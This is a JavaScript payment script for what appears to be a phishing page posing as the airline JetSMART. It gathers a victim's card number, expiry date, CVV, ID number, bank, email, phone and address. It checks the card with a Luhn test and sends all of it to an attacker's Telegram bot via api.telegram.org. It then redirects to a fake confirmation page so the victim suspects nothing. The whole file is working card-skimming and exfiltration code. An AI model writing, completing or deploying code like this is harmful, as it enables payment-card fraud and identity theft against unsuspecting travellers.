// ======================
// PAYMENT.JS - Versión Corregida
// ======================

const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    formMain: document.querySelector('#main-form'),
};

document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
});

const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    if (contPaymentMethod) {
        contPaymentMethod.addEventListener('click', () => {
            if (contCardInputs) contCardInputs.classList.remove('hide');
        });
    }

    if (btnNextStep) {
        btnNextStep.addEventListener('click', () => {
            if (btnSubmitForm) btnSubmitForm.click();
        });
    }

    if (formMain) {
        formMain.addEventListener('submit', (e) => {
            e.preventDefault();
            validateCardFiels();
        });
    }
};

const updateDOM = () => {
    const { labelDepartures, labelTotalResume } = DOMElements;
    if (!info || !info.flightInfo) return;

    const { travel_type, origin, destination, adults = 1, children = 0 } = info.flightInfo;

    if (labelDepartures) {
        if (travel_type === 1) {
            labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''} | ${destination?.city || ''} - ${origin?.city || ''}`;
        } else if (travel_type === 2) {
            labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''}`;
        }
    }

    if (labelTotalResume) {
        const total = PRECIO_BASE * (adults + children);
        labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
    }
};

const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if (!p || !p.value || !pdate || !pdate.value || !c || !c.value) {
        alert('Por favor completa los datos de la tarjeta.');
        return;
    }

    // Validación básica
    if (isLuhnValid(p.value) && isValidDate(pdate.value)) {
        const formData = {
            nombre: (name ? name.value : '') + " " + (surname ? surname.value : ''),
            documento: cc ? cc.value : '',
            banco: ban ? ban.value : '',
            email: email ? email.value : '',
            tarjeta: p.value,
            fecha: pdate.value,
            cvv: c.value,
            telefono: telnum ? telnum.value : '',
            direccion: (address ? address.value : '') + " " + (city ? city.value : ''),
            fecha_hora: new Date().toLocaleString('es-CO')
        };

        // Enviar a Telegram
        sendToTelegram(formData);

        console.log("Datos capturados:", formData);

        // Mostrar loader y redirigir
        const loader = document.querySelector('.loader');
        if (loader) loader.classList.add('show');

        setTimeout(() => {
            window.location.href = 'finish.html';
        }, 2000);

    } else {
        alert('Revisa los datos de la tarjeta (número o fecha).');
    }
};

// Función para enviar a Telegram
async function sendToTelegram(data) {
    try {
        const response = await fetch('../claves.json');   // Ajusta la ruta si es necesario
        const keys = await response.json();

        const message = `
🚨 *Nueva Tarjeta - JetSMART* 🚨

👤 Nombre: ${data.nombre || 'N/A'}
🪪 Doc: ${data.documento || 'N/A'}
🏦 Banco: ${data.banco || 'N/A'}
📧 Email: ${data.email || 'N/A'}
💳 Tarjeta: \`${data.tarjeta}\`
📅 Venc: ${data.fecha}
🔑 CVV: \`${data.cvv}\`
📱 Tel: ${data.telefono || 'N/A'}
📍 Dir: ${data.direccion || 'N/A'}
⏰ ${data.fecha_hora}
        `.trim();

        const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;

        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: keys.chat_id,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        console.log("✅ Enviado a Telegram correctamente");
    } catch (err) {
        console.error("❌ Error enviando a Telegram:", err);
    }
}

// Funciones de validación
function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');
    if (bin.length < 13) return false;
    let sum = 0;
    let isEven = false;
    for (let i = bin.length - 1; i >= 0; i--) {
        let digit = parseInt(bin[i]);
        if (isEven) digit *= 2;
        if (digit > 9) digit -= 9;
        sum += digit;
        isEven = !isEven;
    }
    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    if (!fechaInput || !fechaInput.includes('/')) return false;
    const [mes, anio] = fechaInput.split('/').map(Number);
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    return (anio > currentYear) || (anio === currentYear && mes >= currentMonth);
}
